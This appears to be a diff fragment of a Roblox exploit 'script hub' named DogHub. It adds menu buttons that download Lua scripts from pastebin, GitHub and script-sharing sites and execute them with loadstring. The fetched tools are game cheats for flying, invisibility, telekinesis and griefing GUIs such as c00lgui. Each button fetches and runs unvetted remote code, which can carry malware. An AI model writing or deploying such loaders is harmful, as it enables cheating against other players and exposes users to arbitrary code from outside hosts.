+HubsTab:CreateSection("Pet Simulator")
+HubsTab:CreateButton({Name="LKHUB",Callback=function()loadstring(game:HttpGet("https://rscripts.net/script/lkhub-insane-script-hub-for-multiple-games-2528"))()end})
+HubsTab:CreateButton({Name="Something Hub PSX",Callback=function()loadstring(game:HttpGet("https://scriptblox.com/script/something-hub-%28-the-BEST-x-script-%29_234"))()end})
+HubsTab:CreateSection("FE Tools")
+HubsTab:CreateButton({Name="Fly GUI V3",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()end})
+HubsTab:CreateButton({Name="FE Invisible",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-fe-invisible-OPEN-SOURCE-53560"))()end})
+HubsTab:CreateButton({Name="Ketamine Hub",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()end})
+HubsTab:CreateButton({Name="c00lgui v2",Callback=function()loadstring(game:GetObjects("rbxassetid://16742906657")[1].Source)()end})
+HubsTab:CreateButton({Name="FE Telekinesis",Callback=function()loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty13.lua"))()end})
+HubsTab:CreateButton({Name="FE Fighter",Callback=function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Fighter-inspired-by-Gale-21557"))()end})
+HubsTab:CreateButton({Name="Part Controller",Callback=function()pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PartController/refs/heads/main/PartController.lua",true))()end)end})
+HubsTab:CreateButton({Name="FE Invisible Tool",Callback=function()loadstring(game:HttpGet("https://pastebin.com/raw/71bx8T3L"))()end})
+-- Final Notification
+Luna:Notification({
+    Title = "DogHub",
+    Content = "Fully loaded! Enjoy responsibly ;)",
+    Duration = 6,
+    Icon = "check_circle",
+    ImageSource = "Material"
+})
+
+end
